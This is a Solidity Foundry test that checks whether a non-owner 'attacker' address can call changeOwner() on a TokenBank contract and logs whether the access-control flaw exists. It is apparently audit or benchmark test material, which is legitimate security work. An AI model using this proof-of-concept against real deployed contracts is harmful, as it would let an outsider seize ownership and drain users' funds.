// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x39cfd754c85023648bf003bea2dd498c5612abfa.sol";

contract TokenModifierTest is Test {
    TokenBank tokenBank;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(owner);
        tokenBank = new TokenBank();
    }

    function testNonOwnerCanChangeOwnerWithoutReverting() public {
        console.log("--- BEFORE-Trigger Attack ---");
        console.log("Initial call about to execute...");
        
        console.log("--- Trigger Attack ---");
        console.log("Attacker attempting changeOwner()...");

        try this.attemptChangeOwner() {
            console.log("--- AFTER-Trigger Attack ---");
            console.log("Call succeeded - no revert!");
            console.log("Vulnerability Exists: Non-owner can change owner without access control");
        } catch {
            console.log("--- AFTER-Trigger Attack ---");
            console.log("Call reverted properly");
            console.log("Vulnerability not Exist: Access control prevents non-owner state changes");
        }
    }

    function attemptChangeOwner() external {
        vm.prank(attacker);
        tokenBank.changeOwner(attacker);
    }
}